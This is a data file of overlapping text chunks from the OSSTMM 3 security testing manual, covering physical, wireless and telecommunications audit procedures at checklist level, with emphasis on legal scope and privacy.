due diligence as defined in the Posture Review. 8.8.1 Maintenance (a) Examine and document the timeliness, appropriateness, access to, and extent of processes for equipment and barrier repair in regards to operational security, actual security, and loss controls. (b) Verify the repair and determine the extent to which notice and quality of repairs can be misrepresented and falsified. 8.8.2 Indemnification (a) Document and enumerate the ability to abuse or circumvent employee policy, insurance, non-disclosure, non-compete, liability contracts, or use/user disclaimers for personnel within the scope. (b) Enumerate the use of signs warning of danger, surveillance",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 95
    }
  },
  {
    "text": "extent to which notice and quality of repairs can be misrepresented and falsified. 8.8.2 Indemnification (a) Document and enumerate the ability to abuse or circumvent employee policy, insurance, non-disclosure, non-compete, liability contracts, or use/user disclaimers for personnel within the scope. (b) Enumerate the use of signs warning of danger, surveillance or alarms in effect, health issues, and postings of no entrance. (c) Verify the extent and finality of legal action used to uphold indemnification. 8.9 Configuration Verification Tests to examine the operation of processes under various levels of security conditions. Understanding how processes work under daily routine and efficiencies provides insight to how they should behave under more extreme conditions. 8.9.1 Education Mapping Map types and frequency of physical security and safety assistance, education courses, and training provided to personnel, partners, customers, and specifically to gatekeepers. 8.9.2 Policy Disruption Discover and examine the process and depth of self-policing from personnel for the disruption or non-conformity of physical security and safety policy. 8.9.3 Threat Conditions (a) Map the ready responses of security processes in reaction to increased threat condition levels (i.e. green, yellow, orange, and red alerts) as per requirements determined in the Posture Review. (b) Determine which triggers are required to increase threat levels and verify that they are met. (c) Map the ready responses of security processes in reaction to decreased threat condition levels as per requirements determined in the Posture Review. (d) Discover and examine the extent to which a non-official person provides misinformation regarding threat levels in an authoritative manner to purposely raise or lower ready status. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 128\\n8.10 Property Validation Tests to examine physical property available within the scope or provided by personnel which may be illegal or unethical. 8.10.1 Sharing Verify the extent to which personal assets or those of the organization have been faked, reproduced, or shared illegally and intentionally according to the requirements of the Posture Review through sharing, lending, renting, or leasing services, personal libraries, and personal caches or unintentionally through ignorance or negligence. 8.10.2 Black Market Verify the extent to which personal assets or those of the organization have been faked or reproduced and are being promoted, marketed, or sold between personnel or by the organization. 8.10.3 Sales Channels Verify assets in auctions, flea markets, want-ads, yard sales, swap meets, or property sales which provide contact information through channels originating within the scope. 8.10.4 Storage (a) Verify storage locations and small caches of organizational assets are in the appropriate location within the scope. (b) Verify storage locations and small caches of organizational assets for use or for sale publicly or to other members of the organization are not being deliberately hidden, hoarded, controlled, or saved. 8.10.5 Resource Abuse (a) Enumerate personal items which consume power, fuel, food, water, or other assets within the requirements defined in the Posture Review. (b) Enumerate personal items using channels which are the property of the organization (i.e. Internet servers, jukeboxes, fax machines, etc.). (c) Enumerate openly viewable personal",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 96
    }
  },
  {
    "text": "saved. 8.10.5 Resource Abuse (a) Enumerate personal items which consume power, fuel, food, water, or other assets within the requirements defined in the Posture Review. (b) Enumerate personal items using channels which are the property of the organization (i.e. Internet servers, jukeboxes, fax machines, etc.). (c) Enumerate openly viewable personal items which symbolize beliefs not within the requirements defined in the Posture Review. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 129\\n8.11 Segregation Review Tests for appropriate separation of private or personal information property from business information. Like a privacy review, it is the focal point of the legal and ethical storage, transport, and control of personnel, partner, and customer private information property. 8.11.1 Privacy Containment Mapping Map storage locations of private information property within the scope, what information is stored, how and where the information is stored, and how and where the property is discarded. 8.11.2 Evident Information Enumerate and map from the target documents and physical property with unsecured personal information as defined implicitly as private in regulations and policy of the Posture Review (i.e. full names, race, sex, religion, vacation days, personal web pages, published resumes, personal affiliations, directory inquiries, bank branch, electoral register, etc.). 8.11.3 Disclosure Verify access to stores of private information property of personnel as determined in the Posture Review. 8.11.4 Limitations Examine and document mobility alternatives accessible to people with physical limitations within that channel. 8.11.4 Offensive Materials Verify openly viewable personal property does not flaunt or offend as determined offensive or private in the Posture Review. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 130\\n8.12 Exposure Verification Tests for uncovering information which provides for or leads to authenticated access or allows for access to multiple locations with the same authentication. 8.12.1 Exposure Mapping Discover and enumerate unsecured documents and items with building information regarding the organization such as blueprints, logistics, schedules, keys, access tokens, badges, uniforms, or any particular organizational assets which provide deeper or broader access. 8.12.2 Profiling (a) Profile and verify the structural definition of the targets including material type, height, thickness, and security or safety properties. (b) Discover and enumerate access control sensors, cameras, monitors, man-traps, cages, gates, fences, etc. for type, technology, maker, materials, and security or safety properties. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 131\\n8.13 Competitive Intelligence Scouting Tests for scavenging property that can be analyzed as business intelligence. While competitive intelligence as a field is related to marketing, the process here includes any form of competitive intelligence gathering, including but not limited to economic and industrial espionage. 8.13.1 Business Grinding Discover and map storage locations of business property within the scope, what information is stored, how and where the information is stored, and how and where the property is discarded. 8.13.2 Business Environment Discover and enumerate documents and items with business details such as personnel, pay rates, alliances, partners, major customers, vendors, distributors, investors, business relations, production, development, product information, planning, stocks and trading, and any particular business information or property determined implicitly as",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 97
    }
  },
  {
    "text": "and where the property is discarded. 8.13.2 Business Environment Discover and enumerate documents and items with business details such as personnel, pay rates, alliances, partners, major customers, vendors, distributors, investors, business relations, production, development, product information, planning, stocks and trading, and any particular business information or property determined implicitly as confidential or non-compete from the Posture Review. 8.13.3 Organizational Environment Discover and enumerate documents and items with organizational details such as processes, hierarchy, financial reporting, investment opportunities, mergers, acquisitions, channel investments, channel maintenance, internal social politics, personnel dissatisfaction and turn-over rate, primary vacation times, hirings, firings, and any particular organizational property stated implicitly as confidential or non-compete from the Posture Review. 8.13.4 Operational Environment Discover and enumerate processes which expose operational details such as packaging, shipping, distribution, arrival and departure times of employees, management, customers, methods of interaction, advertising and marketing plans, product development, product capacity, and any particular operational property stated implicitly as confidential or non-compete from the Posture Review. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 132\\n8.14 Quarantine Verification Tests for verifying the proper fielding and containment of people and processes with aggressive or hostile intent within the scope. 8.14.1 Containment Process Identification (a) Identify and examine physical quarantine methods and processes within the scope for aggressive and hostile contacts such as chaotic or violent people, unscheduled sales people, head-hunters, grifters, journalists, competitors, job seekers, job candidates, and disruptive people. (b) Identify and examine physical quarantine methods and process within the scope for managing dangerous and harmful items or substances, illegal substances, and illegally removed company property. (c) Identify and examine physical quarantine methods and processes within the scope for merely suspicious behavior or items and substances of suspect utility. 8.14.2 Containment Levels (a) Verify the state of containment location, length of time, and process of the quarantine method. Ensure that methods are within legal context and boundaries as per the Posture Review. (b) Verify proper procedures are followed for a full lock-down as per the requirements in the Posture Review for environmental threats, biological, chemical, or other contamination threats and in cases of workplace violence. (c) Verify proper procedures for quarantine recovery and return to the proper secure state following a state of lock-down as per the requirements in the Posture Review. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 133\\n8.15 Privileges Audit Tests for gaining access credentials and privileges as supplied to other personnel with the appropriate permissions. 8.15.1 Identification Examine and document the process for obtaining identification through legitimate, illegal (i.e. graft, theft, threats, etc.) and fraudulent (forgery, misrepresentation, etc.) means. 8.15.2 Authorization Verify the use of fraudulent authorization to gain privileges similar to that of other personnel. 8.15.3 Escalation Verify and enumerate accesses to assets through the use of privileges to gain higher privileges to that of gatekeepers. 8.15.4 Special Circumstances Verify gaining access privileges as requested in cases where age (specifically those regarded legally as minors for the region), relationship (i.e. son, daughter, father, mother, etc.) sex, race, custom/culture and religion are",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 98
    }
  },
  {
    "text": "to assets through the use of privileges to gain higher privileges to that of gatekeepers. 8.15.4 Special Circumstances Verify gaining access privileges as requested in cases where age (specifically those regarded legally as minors for the region), relationship (i.e. son, daughter, father, mother, etc.) sex, race, custom/culture and religion are factors which may be granted special circumstances or discriminated against in accordance to the Posture Review. 8.15.5 Subjugation Enumerate and test for inadequacies in access to assets not controlled by the source providing the access (i.e. PINs, ID photos, etc. selected by the actor, sign-ins with identification numbers written in by the actor, etc.). Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 134\\n8.16 Survivability Validation Determining and measuring the resilience of the barriers and guards within the scope to excessive or hostile changes designed to cause operations failure. 8.16.1 Resilience (a) Enumerate and verify that the distraction, removal or quieting of gateway personnel will not allow for direct access to assets or operations. (b) Enumerate and verify that the disabling or destruction of operational security measures or controls will not allow for direct access to assets or operations. (c) Verify that the isolation of the scope from resources such as fuel, power, food, water, communications, etc. does not allow for direct access to assets or operations. (d) Verify that high alert threat conditions do not shut down or minimize operational security measures or controls allowing for direct access to assets or operations. 8.16.2 Continuity (a) Enumerate and verify conditions where access delays are properly addressed through back- up personnel or an automated means for timely access to services, processes, and operations. (b) Enumerate and verify that the distraction, removal or quieting of gateway personnel will not halt or deny timely access to services, processes, and operations. (c) Enumerate and verify that the disabling or destruction of operational security measures or controls will not deny timely access to services, processes, and operations. (d) Verify that the isolation of the scope from resources such as fuel, electrical power, food, water, communications, etc. will not halt or deny access to services, processes, and operations. (e) Verify that the inability to remove waste, pollutants, or other contaminants from the scope will not halt or deny access to services, processes, and operations. (f) Verify that high alert threat conditions do not halt or deny access to services, processes, and operations. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 135\\n8.17 Alert and Log Review A gap analysis between activities performed with the test and the true depth of those activities as recorded or from third-party perceptions, both human and mechanical. 8.17.1 Alarm Verify and enumerate the use of a localized or scope-wide warning system, log or message for each access gateway where a suspect situation is noted by personnel upon suspicion of circumvention attempts, fraudulent activity, trespass, or breach. Ensure that the sensors/systems are installed to national, regional or international standards and regularly tested to cover all accessible points. 8.17.2 Storage and Retrieval Document and verify",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 99
    }
  },
  {
    "text": "message for each access gateway where a suspect situation is noted by personnel upon suspicion of circumvention attempts, fraudulent activity, trespass, or breach. Ensure that the sensors/systems are installed to national, regional or international standards and regularly tested to cover all accessible points. 8.17.2 Storage and Retrieval Document and verify the permissions and efficient access to alarm, log, and notification storage locations and property. Access to areas where sensitive information is processed or stored should be controlled and restricted to authorized personnel only; an audit trail of all access should be securely maintained. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 136\\nThe information to be found within the wireless spectrum is not limited to product specifications. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 137\\nChapter 9 - Wireless Security Testing Spectrum security (SPECSEC) is the security classification which includes electronics security (ELSEC), signals security (SIGSEC), and emanations security (EMSEC). ELSEC are the measures to deny unauthorized access to information derived from the interception and analysis of non-communications electromagnetic radiations. SIGSEC are the measures to protect wireless communications from unauthorized access and jamming. EMSEC are the measures to prevent the machine emanations that, if intercepted and analyzed, would disclose the information transmitted, received, handled, or otherwise processed by information systems equipment. Testing this channel requires interaction with barriers to assets over Electromagnetic (EM) and Microwave (MW) frequencies. This channel covers the interaction of the Analyst within proximity range of the targets. While some services consider this simply as “scanning”, the true compliance objectives of security testing in this channel are physical and logical barrier testing and gap measurement to the required security standard outlined in company policy, industry regulations, or regional legislation. The Analyst will be required to have adequate protection from electromagnetic power sources and other forms of radiation. Analysts will also need to be prepared for the possibility of accidental bodily harm from exposure to electromagnetic and microwave radiation, especially that which can permanently damage hearing or sight. Proper equipment should warn when within range of Electromagnetic and Microwave radiation from -12dB and greater. Specific frequencies may adversely affect implanted medical devices, cause vertigo, headaches, stomach cramps, diarrhea, and other discomforts on both an emotional and physical level. Competent Analysts will require sufficient knowledge of EM and MW radiation and critical thinking skills to assure factual data collection creates factual results through correlation and analysis. Considerations Please note the following considerations to assure a safe, high quality test: 1. Ignorantia legis neminem excusat: Analysts who do not do proper posture review for the scope as well as the regions targeted for business or interactions may not escape punishment for violating laws merely because they were unaware of the law; that is, Analysts have presumed knowledge of the law. Analysts are considered professionals in this subject matter and, therefore, the assumption exists that even regarding what may not be common knowledge for the average person about a foreign region’s laws regarding EM and MW communication systems, will be known to",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 100
    }
  },
  {
    "text": "that is, Analysts have presumed knowledge of the law. Analysts are considered professionals in this subject matter and, therefore, the assumption exists that even regarding what may not be common knowledge for the average person about a foreign region’s laws regarding EM and MW communication systems, will be known to the Analyst. 2. In personam: Testing must specifically target only SPECSEC from personnel who are under direct legal contract with the scope owner, computer systems on the property of the scope owner, and EM or MW signals or emanations of power level great enough to disrupt or harm wireless communications within the scope. Analysts must make efforts to not invade upon a person’s private life such as listening to or recording personal communications originating within the scope, where that private life has made efforts to separate itself from the scope. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 138\\n9.1 Posture Review Initial studies of the posture include the laws, ethics, policies, industry regulations, and political culture which influence the security and privacy requirements for the scope. This review forms a matrix to which testing should be mapped but not constrained. 9.1.1 Policy Review and document appropriate organizational policy regarding security, integrity, and privacy responsibilities of the scope. Review and document contracts and Service Level Agreements (SLAs) with service providers and other involved third parties. 9.1.2 Legislation Review and document appropriate regional and national legislation and industry regulations regarding the security and privacy requirements of the organization in the scope as well as that which includes the appropriate customers, partners, organizational branches, or resellers outside the scope. 9.1.3 Culture Review and document appropriate organizational culture in the scope towards security and privacy awareness, required and available personnel training, organizational hierarchy, help desk use, and requirements for reporting security issues. 9.1.4 Age Review and document the age of systems, software, and service applications required for operations. 9.1.5 Fragile Artifacts Review and document any systems, software, and service applications which require special care due to high use, instabilities, or a high rate of change. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 139\\n9.2 Logistics Preparation of the channel test environment needed to prevent false positives and false negatives which lead to inaccurate test results. 9.2.1 Communications Equipment Test for equipment which may transmit Electromagnetic Radiation, such as CRTs, LCDs, printers, modems, and cell phones, and which may be used to recreate the data that is displayed on the screen, printed, or transmitted, etc. Exploiting this vulnerability is known as Van Eck phreaking. 9.2.2 Communications Test which protocols are used within the scope and methods of transmission. 9.2.3 Time Test for the time frame of equipment operation. For example, is a wireless access point (AP) available 24/7 or just during normal business hours? 9.3 Active Detection Verification Determination of active and passive controls to detect intrusion to filter or deny test attempts must be made prior to testing to mitigate the risk of creating false positives and negatives in the test result data as",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 101
    }
  },
  {
    "text": "(AP) available 24/7 or just during normal business hours? 9.3 Active Detection Verification Determination of active and passive controls to detect intrusion to filter or deny test attempts must be made prior to testing to mitigate the risk of creating false positives and negatives in the test result data as well as changing the alarm status of monitoring personnel or agents. 9.3.1 Channel Monitoring Test whether controls are in place for monitoring intrusion or signal tampering. 9.3.2 Channel Moderating Test whether controls are in place to block signals (jamming) or alert for unauthorized activities. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 140\\n9.4 Visibility Audit Enumeration and verification tests for the visibility of personnel with which interaction is possible via all channels. 9.4.1 Interception Locate Access Control, Perimeter Security, and Ability to Intercept or Interfere with wireless channels. 9.4.2 Passive Signal Detection (a) Determine which frequencies and signals can leak into or out of the target area using a directional, high gain antenna and passive detection means such as frequency analysis. (b) Create a heat map of the scope showing all sources of the radiation and their radii and strength. (c) Test for sources that interact without authorization. (d) Collect information broadcast by these sources. (e) Map all found data to the emission limit values currently required in the region for all detected radiation. 9.4.2 Active Signal Detection Examine which frequencies or electromagnetic signal broadcasts trigger responses such as that from RFID or other interactive wireless sources. (Radio Frequency Identifier tags are composed of an integrated circuit, which is sometimes half the size of a grain of sand, and an antenna – usually a coil of wires. Information is stored on the integrated circuit and transmitted via the antenna when probed by the right signal. The exact frequencies used in RFID systems may therefore vary by country or region.) Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 141\\n9.5 Access Verification Tests for the enumeration of access points to personnel within the scope. While access to personnel outside of the scope is a real scenario and one often used for information property theft, the Analyst may be limited to scope-only interaction to protect the independent privacy rights of the personnel in their private life. 9.5.1 Evaluate Administrative Access to Wireless Devices Determine if access points are turned off during portions of the day when they will not be in use. 9.5.2 Evaluate Device Configuration Test and document using directional and high-gain antennas that wireless devices are set to the lowest possible power setting to maintain sufficient operation that will keep transmissions within the secure boundaries of the organization. 9.5.3 Evaluate Configuration, Authentication, and Encryption of Wireless Networks Verify that the access point’s default Service Set Identifier (SSID) has been changed. 9.54 Authentication Enumerate and test for inadequacies in authentication and authorization methods. 9.5.5 Access Control Evaluate access controls, perimeter security, and ability to intercept or interfere with communication, determining the level of physical access controls to access points and devices controlling",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 102
    }
  },
  {
    "text": "point’s default Service Set Identifier (SSID) has been changed. 9.54 Authentication Enumerate and test for inadequacies in authentication and authorization methods. 9.5.5 Access Control Evaluate access controls, perimeter security, and ability to intercept or interfere with communication, determining the level of physical access controls to access points and devices controlling them (keyed locks, card badge readers, cameras, etc.). Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 142\\n9.6 Trust Verification Tests for trusts between personnel within the scope where trust refers to access to information or physical property without the need for identification or authentication. 9.6.1 Misrepresentation Test and document the authentication-method of the clients. 9.6.2 Fraud Test and document the depth of requirements for access to wireless devices within the scope with the use of fraudulent credentials. 9.6.3 Resource Abuse Test and document the depth of requirements to send the property outside of the scope to a known and trusted source or throughout the scope itself to other personnel without any established, required credentials. 9.6.4 Blind Trust Test and document the connections that are made to a false or compromised receiver. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 143\\n9.7 Controls Verification Tests to enumerate types of loss controls used to protect information. 9.7.1 Non-repudiation Enumerate and test for use or inadequacies from daemons and systems to properly identify and log access or interactions to property for specific evidence to challenge repudiation, and document the depth of the recorded interaction and the process of identification. 9.7.2 Confidentiality Enumerate and test for use of equipment to dampen Electromagnetic transmission signals outside of the company and the controls in place for securing or encrypting wireless transmissions. 9.7.3 Privacy Determine the level of physical access controls to access points and devices controlling them (keyed locks, card badge readers, cameras, etc.). 9.7.4 Integrity Determine that data can only be accessed and modified by those that are authorized and ensure that adequate encryption is in use for guaranteeing signing and confidentiality of communications. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 144\\n9.8 Process Verification Tests to examine the maintenance of functional security awareness of personnel in established processes and due diligence as defined in the Posture Review. 9.8.1 Baseline Examine and document the baseline configuration to ensure the security stance is in-line with the security policy. 9.8.2 Proper Shielding Examine and determine that proper shielding is in place. For example, determine that printers are in specially shielded cabinets to block EMT, panels or metallic paint are used to block wireless signals, etc. 9.8.3 Due Diligence Map and verify any gaps between practice and requirements as determined in the Posture Review through all channels. 9.8.4 Indemnification Document and enumerate that targets and services which are protected from abuse or circumvention of employee policy, are insured for theft or damages, or use liability and permission disclaimers. Verify the legality and appropriateness of the language in the disclaimers. 9.9 Configuration Verification Tests to examine the ability to circumvent or disrupt functional security in assets. 9.9.1 Common Configuration Errors",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 103
    }
  },
  {
    "text": "from abuse or circumvention of employee policy, are insured for theft or damages, or use liability and permission disclaimers. Verify the legality and appropriateness of the language in the disclaimers. 9.9 Configuration Verification Tests to examine the ability to circumvent or disrupt functional security in assets. 9.9.1 Common Configuration Errors Perform brute force attacks against access points to discern the strength of passwords. Verify that passwords contain both upper and lower case letters, numbers, and special characters. Access points which use case insensitive passwords, make it easier for attackers to conduct a brute force guessing attack due to the smaller space of possible passwords. 9.9.2 Configuration Controls Examine controls, including baseline configuration, to validate configurations are according to the security policy. 9.9.3 Evaluate and Test Wiring and Emissions Verify that all wiring feeds into and out of shielded rooms are made of fiber, where possible. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 145\\n9.10 Property Validation Tests to examine information and physical property available within the scope, or provided by personnel, which may be illegal or unethical. 9.10.1 Sharing Verify the extent to which individually licensed, private, faked, reproduced, non-free, or non-open property is shared between personnel either intentionally through sharing processes and programs, libraries, and personal caches or unintentionally through mismanagement of licenses and resources, or negligence. 9.10.2 Rogue Wireless Transceivers Perform a complete inventory of all wireless devices. Verify that the organization has an adequate security policy that addresses the use of wireless technology. 9.11 Segregation Review Tests for appropriate separation of private or personal information property from business information. Like a privacy review, it is the focal point of the legal and ethical storage, transmission, and control of personnel, partner, and customer private information property. 9.11.1 Privacy Containment Mapping Map gatekeepers of private information within the scope, what information is stored, how and where the information is stored, and over which channels the information is communicated. 9.11.3 Disclosure Examine and document types of disclosures of private information in wireless spectrum. 9.11.4 Limitations Examine and document types of gateways and channel alternatives accessible to people with physical limitations within that channel. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 146\\n9.12 Exposure Verification Tests for uncovering information which provides for or leads to authenticated access or allows for access to multiple locations with the same authentication. 9.12.1 Exposure Mapping Enumerate and map personnel information regarding the organization such as organization charts, key personnel titles, job descriptions, personal and work telephone numbers, mobile phone numbers, business cards, shared documents, resumes, organizational affiliations, private and public e-mail addresses, log-ins, log-in schemes, passwords, back-up methods, insurers, or any particular organizational information stated implicitly as confidential in regulations and policy. 9.12.2 Profiling Examine and verify with the use of a directional and high-gain antenna if wireless signals with information regarding the device are extending out past the target’s walls or property. 9.13 Competitive Intelligence Scouting Tests for scavenging property that can be analyzed as business intelligence. While competitive intelligence as a field is",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 104
    }
  },
  {
    "text": "and verify with the use of a directional and high-gain antenna if wireless signals with information regarding the device are extending out past the target’s walls or property. 9.13 Competitive Intelligence Scouting Tests for scavenging property that can be analyzed as business intelligence. While competitive intelligence as a field is related to marketing, the process here includes any form of competitive intelligence gathering, including but not limited to economic and industrial espionage. 9.13.1 Business Grinding Map targets within the scope from active and passive analysis of emanations: what information is stored, how and where the information is stored, and how the information is communicated. 9.13.2 Business Environment Explore and document business details such as alliances, partners, major customers, vendors, distributors, investors, business relations, production, development, product information, planning, stocks and trading, and any particular business information or property stated implicitly as confidential in regulations and policy. 9.13.3 Organizational Environment Examine and document types of disclosures of business property from gatekeepers on operations, processes, hierarchy, financial reporting, investment opportunities, mergers, acquisitions, channel investments, channel maintenance, internal social politics, personnel dissatisfaction and turn-over rate, primary vacation times, hirings, firings, and any particular organizational property stated implicitly as confidential in regulations and policy. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 147\\n9.14 Quarantine Verification The determination and measurement of effective use of quarantine for all access to and within the target. 9.14.1 Containment Process Identification Identify and examine quarantine methods and processes at the target in all channels for aggressive and hostile contacts. 9.14.2 Containment Levels Verify the state of containment, length of time, and all channels where interactions have quarantine methods. Ensure that methods are within legal context and boundaries. 9.15 Privileges Audit Tests where credentials are supplied to the user and permission is granted for testing with those credentials. 9.15.1 Identification Examine and document the process for obtaining identification through both legitimate and fraudulent means on all channels. 9.15.2 Authorization Verify the use of fraudulent authorization on all channels to gain privileges similar to that of other personnel. 9.15.3 Escalation Verify and map access to information through the use of privileges to gain higher privileges. 9.15.4 Subjugation Enumerate and test for inadequacies from all channels to use or enable loss controls not enabled by default. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 148\\n9.16 Survivability Validation Determining and measuring the resilience of the target within the scope to excessive or hostile changes designed to cause service failure. 9.16.1 Continuity Enumerate and test for inadequacies from target with regard to access delays and service response time through back-up personnel or automated means for alternate access. 9.16.2 Resilience Map and document the process of gatekeepers disconnecting channels due to breach or safety concerns as a gap analysis with regulation and security policy. 9.17 Alert and Log Review A gap analysis between activities performed with the test and the true depth of those activities as recorded or from third-party perceptions both human and mechanical. 9.17.1 Alarm Verify and enumerate the use of a localized",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 105
    }
  },
  {
    "text": "as a gap analysis with regulation and security policy. 9.17 Alert and Log Review A gap analysis between activities performed with the test and the true depth of those activities as recorded or from third-party perceptions both human and mechanical. 9.17.1 Alarm Verify and enumerate the use of a localized or scope-wide warning system, log, or message for each access gateway over each channel where a suspect situation is noted by personnel upon suspicion of circumvention attempts, social engineering, or fraudulent activity. 9.17.2 Storage and Retrieval Document and verify unprivileged access to alarm, log, and notification storage locations and property. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 149\\nIn telecommunications people are as much a part of the process as are the machines. They are rarely mutually exclusive. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 150\\nChapter 10 - Telecommunications Security Testing COMSEC is a classification for the material security within the ELSEC realm which is within the limits of telecommunications over wires. This channel covers the interaction of the Analyst with the targets. While some services consider this simply as “phreaking”, the true compliance objective of security testing in this channel is logical barrier testing and gap measurement against the required security standard as outlined in company policy, industry regulations, or regional legislation. The Analyst will be required to have multiple tools and methods for the completion of some tasks to assure that suspicion is not raised among personnel by continual and sequential ringing of phones and that tests are not made invalid due to an early discovery or heightened paranoia. Analysts will also need to be prepared for working with both digital and analog telecommunications equipment, sound frequency analyzers, and within information networks providing regional content through local phone providers. Competent Analysts will require an electronics background in both analog and digital telephony and critical thinking skills to assure factual data collection creates factual results through correlation and analysis. Considerations Please note the following considerations to assure a safe, high quality test: 1. Ignorantia legis neminem excusat: Analysts who do not do proper posture review for the scope as well as the regions targeted for business or interactions may not escape punishment for violating laws merely because they were unaware of the law; that is, persons have presumed knowledge of the law. Analysts are considered professionals in this subject matter and, therefore, the assumption exists that even what may not be common knowledge for a normal person about a foreign region’s laws regarding computer systems, will be known by professionals as they are aware of the laws necessary to engage in their undertakings. 2. Property rights: Testing must specifically target only systems which are under direct legal ownership of the scope owner or computer systems on the property of the scope owner. Such property or personal effects should remain personal and private unless it specifically involves the scope owner through disparagement, false light, competitiveness, or reasons stated in personnel contract agreements. Analysts must make efforts to not invade",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 106
    }
  },
  {
    "text": "of the scope owner or computer systems on the property of the scope owner. Such property or personal effects should remain personal and private unless it specifically involves the scope owner through disparagement, false light, competitiveness, or reasons stated in personnel contract agreements. Analysts must make efforts to not invade upon a person’s private life where that private life has made efforts to separate itself from the scope. Analysts with a special agreement to test systems which are under direct contract but not owned, or are owned but not housed on the owner’s legal property, must take great caution to assure tests have minimum impact on other systems outside the scope or contract. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 151\\n10.1 Posture Review Initial studies of the posture include the laws, ethics, policies, industry regulations, and political culture which influence the security and privacy requirements for the scope. In most cases, a target may also have contracts with providers and other third parties which may need to be reviewed and documented. This review forms a matrix against which testing should be mapped but not constrained, due to the ubiquity of the channel endpoints. Therefore it is important to consider, as some legislation requires, the target market or end users of this channel which must also be added to the scope for this module. 10.1.1 Policy (a) Review and document appropriate organizational policy regarding security, integrity, and privacy requirements of the scope. Verify the limitations on telecommunications imposed by the security policy. (b) Review and document contracts and Service Level Agreements (SLAs) with service providers and other involved third parties. 10.1.2 Legislation Review and document appropriate regional and national legislation regarding the security and privacy requirements of the organization in the scope as well as that which includes the appropriate customers, partners, organizational branches, or resellers outside the scope. Where applicable, pay special attention to privacy and data retention of Call Detail Records, laws and rulings governing interception or monitoring of telecommunications, and provision of critical services such as E-911. 10.1.3 Culture Review and document appropriate organizational culture in the scope towards security and privacy awareness, required and available personnel training, organizational hierarchy, help desk use, and requirements for reporting security issues. 10.1.4 Age Review and document the age of systems, software, and service applications required for operations. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 152\\n10.1.5 Fragile Artifacts Review and document any systems, software, and service applications which require special care due to high use, instabilities, or a high rate of change. 10.1.6 Attack Vectors (a) PBX testing (b) Voice mailbox testing (c) FAX and Modem surveying, polling, and testing (d) Remote Access Services (RAS) testing (e) Backup ISDN lines testing (f) Voice over IP testing (g) X.25 packet switched network testing 10.2 Logistics Preparation of the channel test environment needed to prevent false positives and false negatives which lead to inaccurate test results. 10.2.1 Framework (a) Verify the scope and the owner(s) of the targets outlined for the",
    "metadata": {
      "doc_id": "OSSTMM.3",
      "chunk_id": 107
    }
  },
  {
